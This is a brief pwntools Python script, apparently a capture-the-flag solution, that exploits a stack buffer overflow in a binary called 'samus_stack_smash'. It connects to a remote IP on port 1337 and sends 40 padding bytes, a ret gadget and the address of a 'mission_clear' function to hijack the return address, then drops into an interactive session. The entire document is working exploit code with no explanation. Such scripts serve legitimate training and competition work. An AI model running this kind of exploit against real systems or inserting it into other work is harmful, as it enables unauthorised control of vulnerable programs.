from pwn import *

context.binary = "./samus_stack_smash"

p = remote("192.241.166.117", 1337)

ret = 0x40101a
mission_clear = 0x401216

payload = b"A" * 40
payload += p64(ret)
payload += p64(mission_clear)

p.sendlineafter(b"> ", payload)
p.interactive()